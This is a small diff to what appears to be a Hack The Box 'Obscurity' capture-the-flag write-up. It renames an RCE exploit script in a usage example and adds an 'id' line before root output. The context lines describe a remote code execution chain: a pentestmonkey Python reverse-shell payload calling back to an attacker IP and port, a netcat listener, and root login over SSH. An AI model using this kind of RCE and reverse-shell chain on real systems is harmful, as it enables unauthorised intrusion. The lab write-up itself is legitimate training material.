@@ -68,7 +68,7 @@ the exploit string looks something like this:
 I used the python one-liner reverse shell from pentestmonkey as a payload.
 
 the script can be used like this:
-    ./exploit.sh http://obscure.htb:8080/ 10.10.14.2 2000
+    ./obscurity_webserver_python_RCE.sh http://obscure.htb:8080/ 10.10.14.2 2000
                   ^         ^        ^       ^         ^
               PROTOCOL    HOST     PORT  YOUR IP   YOUR PORT
 catching with a netcat listener:
@@ -117,6 +117,7 @@ and then
 you can login as root:
 ssh root@obscure.htb
 
+id
 uid=0(root) gid=0(root) groups=0(root)
 
 root'd
